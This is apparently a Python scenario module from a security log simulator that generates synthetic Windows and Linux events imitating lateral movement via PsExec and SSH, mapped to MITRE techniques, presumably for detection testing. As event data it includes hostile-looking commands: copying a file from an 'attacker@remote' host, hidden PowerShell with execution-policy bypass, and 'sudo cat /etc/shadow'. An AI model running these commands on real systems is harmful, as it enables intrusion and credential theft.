from typing import Dict, Final
# pyrefly: ignore [missing-import]
from loguru import logger
from shared.schemas.ecs.base import Process
from simulator.attack_scenarios.base import ScenarioBase, ScenarioMetadata
from simulator.config.entities import EntityManager, SimulationConfig
from simulator.generators.base import BaseGenerator
WIN_PSEXEC: Final[str] = "C:\\Windows\\PSEXESVC.exe"
WIN_CMD: Final[str] = "C:\\Windows\\System32\\cmd.exe"
WIN_PS: Final[str] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
NIX_SCP: Final[str] = "/usr/bin/scp"
NIX_SSH: Final[str] = "/usr/bin/ssh"
NIX_BASH: Final[str] = "/bin/bash"

STEP_DELAY: Final[tuple] = (2.0, 5.0)
TASK_DELAY: Final[tuple] = (10.0, 20.0)
class LateralMovementScenario(ScenarioBase):


    def __init__(self, entity_manager: EntityManager, config: SimulationConfig, generators: Dict[str, BaseGenerator]):
        metadata = ScenarioMetadata(
            name="Lateral Movement via Remote Services",
            description="Simulates adversary movement across the network using PsExec or SSH.",
            mitre_tactics=["Lateral Movement", "Execution"],
            mitre_techniques=["T1021.001", "T1021.004", "T1570", "T1569.002"],
            supported_platforms=["windows", "linux"],
            version="1.1.0"
        )
        super().__init__(metadata, entity_manager, config, generators)
        self._platform: str = ""

    def execute(self) -> None:
        """Main dispatcher. Validates context and dispatches platform-specific logic."""
        self._validate_state()
        self._platform = self.victim_host.os_family.strip().lower()
        
        log = logger.bind(
            technique="T1021",
            host=self.victim_host.hostname,
            user=self.victim_user.name,
            platform=self._platform
        )
        log.info(f"Executing Lateral Movement on {self.victim_host.hostname}")

        if self._platform == "windows":
            self._execute_windows_sequence(self.generators["windows"])
        elif self._platform == "linux":
            self._execute_linux_sequence(self.generators["linux"])
        else:
            raise RuntimeError(f"Unsupported platform: {self._platform}")

    def _validate_state(self) -> None:
        """Ensures all actors and generators are present."""
        if not self.victim_host or not self.victim_user or not self.attacker:
            raise RuntimeError("Lateral movement scenario lacks required actor context.")
        if not self.attacker.ip_pool:
            raise RuntimeError(f"Attacker {self.attacker.name} has no IP pool.")
        
        platform = self.victim_host.os_family.strip().lower()
        if platform not in self.generators:
            raise RuntimeError(f"Required generator '{platform}' is missing.")

    def _execute_windows_sequence(self, gen: BaseGenerator) -> None:
        """Windows: 4624 -> 4688 PSEXESVC -> 4688 cmd -> 4688 powershell -> 4104."""
        self._wait(*STEP_DELAY)
        self.add_event(gen.generate_4624(self.victim_host, self.victim_user, logon_type=3))
        
        self._wait(*TASK_DELAY)
        self._emit_win_proc(gen, "PSEXESVC.exe", WIN_PSEXEC, f"{WIN_PSEXEC} -accepteula")
        
        self._wait(*STEP_DELAY)
        self._emit_win_proc(gen, "cmd.exe", WIN_CMD, f"{WIN_CMD} /c net share")
        
        self._wait(*STEP_DELAY)
        self._emit_win_proc(gen, "powershell.exe", WIN_PS, f"{WIN_PS} -ExecutionPolicy Bypass -WindowStyle Hidden")
        self.add_event(gen.generate_4104(self.victim_host, self.victim_user, "Get-LocalGroupMember Administrators"))

    def _execute_linux_sequence(self, gen: BaseGenerator) -> None:
        """Linux: SSH Login -> scp -> ssh -> bash -> sudo."""
        self._wait(*STEP_DELAY)
        src_ip = str(self._rng.choice(self.attacker.ip_pool))
        self.add_event(gen.generate_ssh_login(self.victim_host, self.victim_user, True, src_ip))
        
        self._wait(*TASK_DELAY)
        self.add_event(gen.generate_auditd_exec(self.victim_host, self.victim_user, f"{NIX_SCP} attacker@remote:/tmp/p /tmp/p"))
        
        self._wait(*STEP_DELAY)
        self.add_event(gen.generate_auditd_exec(self.victim_host, self.victim_user, f"{NIX_SSH} {self.victim_user.name}@other-host"))
        
        self._wait(*STEP_DELAY)
        self.add_event(gen.generate_auditd_exec(self.victim_host, self.victim_user, NIX_BASH))
        
        self._wait(*STEP_DELAY)
        self.add_event(gen.generate_sudo(self.victim_host, self.victim_user, "cat /etc/shadow"))

    def _wait(self, min_s: float, max_s: float) -> None:
        """Deterministic delay helper."""
        self.advance_time(self._rng.uniform(min_s, max_s))

    def _emit_win_proc(self, gen: BaseGenerator, name: str, path: str, cmd: str) -> None:
        """Creates and emits a Windows 4688 event."""
        proc = Process(
            pid=self._rng.randint(1000, 9999),
            name=name,
            executable=path,
            command_line=cmd
        )
        self.add_event(gen.generate_4688(self.victim_host, self.victim_user, proc))

